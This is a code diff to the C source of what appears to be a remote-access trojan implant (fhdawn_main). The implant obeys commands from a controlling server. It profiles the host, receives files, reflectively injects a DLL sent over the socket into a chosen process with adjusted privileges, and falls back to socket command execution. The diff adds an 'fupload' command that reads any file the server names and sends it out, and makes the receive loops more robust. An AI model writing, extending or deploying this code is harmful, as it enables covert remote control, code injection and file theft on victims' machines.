@@ -9,7 +9,8 @@ Modified: -
 #include "LoadLibraryR.h"
 
 int fsize = 0;
-char* fileinfo[3];
+char* fileinfo[3]; 
+char temp[BUFFER]; // Temporary buffer to receive file information
 
 TOKEN_PRIVILEGES priv = { 0 };
 HANDLE hModule = NULL;
@@ -67,7 +68,7 @@ void fhdawn_main(void)
         {
             connected = FALSE;
         }
-
+        // Check Host, Get mac
         if (strcmp(recvbuf, "checkhost") == 0)
         {
             memset(recvbuf, '\0', BUFFER);
@@ -79,11 +80,11 @@ void fhdawn_main(void)
             CheckHost(recvbuf);
 
         }
+        // Receive file from server
         else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
         {
 
             int expected = 0; // expected bytes of size
-            char  temp[BUFFER]; // Temporary buffer to receive file information
             DWORD dwBytesWritten = 0; // number of bytes written
             BOOL write; // Return value of WriteFile();
 
@@ -112,8 +113,13 @@ void fhdawn_main(void)
                         connected = FALSE;
                         printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                     }
-                    write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
-                    total += fsize; // Add number of bytes received to total.
+                    else if (fsize == 0) {
+                        break;  
+                    }
+                    else {
+                        write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
+                        total += fsize; // Add number of bytes received to total.
+                    }
                 } while(total != expected);
                 
                 if (write == FALSE)
@@ -126,29 +132,40 @@ void fhdawn_main(void)
                 CloseHandle(recvfile);
             }
         }
+        // Reflective DLL Injection over socket
         else if (strcmp(recvbuf, "fdll") == 0)
         {
-            memset(recvbuf, '\0', BUFFER);
-            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            
+            memset(temp, '\0', BUFFER);
+            int return_code = recv(sockfd, temp, BUFFER, 0);
             if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
             {
                 break;
             }
-            split(recvbuf, fileinfo, ":");
+            split(temp, fileinfo, ":");
             int expected = atoi(fileinfo[1]);
             DWORD dwProcessId = ProcessId(fileinfo[2]);
             unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
-            //unsigned char* DLL = malloc(expected + 1);
+
             memset(recvbuf, '\0', BUFFER);
             ZeroMemory(DLL, expected + 1);
             int total = 0;
-            // set_blocking_mode(sockfd, FALSE);
+
             do{
                 fsize = recv(sockfd, recvbuf, BUFFER, 0);
-                memcpy(DLL + total, recvbuf, fsize);
-                total += fsize;
+                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+                {
+                    connected = FALSE;
+                    // printf("[X] Connection interrupted while receiving DLL\n");
+                }
+                else if (fsize == 0) {
+                    break;
+                }
+                else {
+                    memcpy(DLL + total, recvbuf, fsize);
+                    total += fsize;
+                }
             } while(total != expected);
-            // set_blocking_mode(sockfd, TRUE);
 
             do {
                 if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
@@ -184,6 +201,31 @@ void fhdawn_main(void)
                 CloseHandle(hProcess);
             }
 
+        }
+        // Upload File to Server
+        else if (strstr(recvbuf, "fupload") != NULL)
+        {
+            memset(fileinfo, '\0', 3);
+            split(recvbuf, fileinfo, ":");
+            char fbuffer[500];
+            memset(fbuffer, '\0', 500);
+            sockprintf(sockfd, "FILE:%s", fileinfo[1]);
+            int bytes_read;
+            FILE* fs = fopen(fileinfo[1], "rb"); // I'm using fopen instead of ReadFile because this is much easier for me and this works
+            if (fs == NULL) {
+                sockprintf(sockfd, "[Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
+            }
+            else {
+                while (!feof(fs)) {
+                    if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
+                        send(sockfd, fbuffer, bytes_read, 0);
+                    }
+                    else {
+                        break;
+                    }
+                }
+            }
+            fclose(fs);
         }
         else {
             ExecSock();
